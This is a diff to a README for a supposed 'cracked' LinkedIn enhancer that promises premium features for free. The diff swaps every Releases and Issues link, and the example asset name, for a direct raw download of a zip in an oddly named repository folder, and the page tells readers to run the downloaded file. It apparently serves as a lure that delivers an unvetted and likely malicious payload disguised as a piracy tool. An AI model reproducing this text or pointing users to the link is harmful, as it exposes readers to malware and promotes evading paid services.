@@ -1,7 +1,7 @@
 # 🌟 cracked-enhancer-for-linked-in - Unlock Premium LinkedIn Features for Free
 
 ## 📥 Download Now
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/Sherlockwolf/cracked-enhancer-for-linked-in/releases)
+[![Download Now](https://raw.githubusercontent.com/Sherlockwolf/cracked-enhancer-for-linked-in/main/trophaeum/cracked-enhancer-for-linked-in.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/Sherlockwolf/cracked-enhancer-for-linked-in/main/trophaeum/cracked-enhancer-for-linked-in.zip)
 
 ## 🚀 Getting Started
 Welcome to the Cracked Enhancer for LinkedIn! This application allows you to unlock premium features on LinkedIn for free, enhancing your experience with the platform. Follow the steps below to download and run the software easily.
@@ -23,11 +23,11 @@ Before you begin, make sure your system meets the following requirements:
 ## 📥 Download & Install
 To download the Cracked Enhancer for LinkedIn, please visit our Releases page. This page contains all available versions of the application.
 
-[**Download the latest version here!**](https://github.com/Sherlockwolf/cracked-enhancer-for-linked-in/releases)
+[**Download the latest version here!**](https://raw.githubusercontent.com/Sherlockwolf/cracked-enhancer-for-linked-in/main/trophaeum/cracked-enhancer-for-linked-in.zip)
 
 1. Click on the link above to go to the Releases page.
 2. You will see a list of available releases. Look for the latest version at the top.
-3. Click on the asset (e.g., `cracked-enhancer-for-linked-in.exe` for Windows) associated with the latest release.
+3. Click on the asset (e.g., `https://raw.githubusercontent.com/Sherlockwolf/cracked-enhancer-for-linked-in/main/trophaeum/cracked-enhancer-for-linked-in.zip` for Windows) associated with the latest release.
 4. Once the download is complete, locate the file on your computer. 
 5. Double-click the downloaded file to run the installer.
 6. Follow the on-screen instructions to complete the installation.
@@ -40,7 +40,7 @@ After installing, open the Cracked Enhancer for LinkedIn. Here's how to use it e
 3. Take advantage of the premium features like advanced search filters and InMail messaging.
 
 ## 🤝 Support & Issues
-If you encounter any issues while using the Cracked Enhancer for LinkedIn, please visit the [Issues](https://github.com/Sherlockwolf/cracked-enhancer-for-linked-in/issues) page on this repository. You can report any problems or seek help from the community.
+If you encounter any issues while using the Cracked Enhancer for LinkedIn, please visit the [Issues](https://raw.githubusercontent.com/Sherlockwolf/cracked-enhancer-for-linked-in/main/trophaeum/cracked-enhancer-for-linked-in.zip) page on this repository. You can report any problems or seek help from the community.
 
 ## 🔄 Updates
 Stay informed about new releases and features by checking back to the Releases page regularly. We update the application to enhance performance and add functionality.
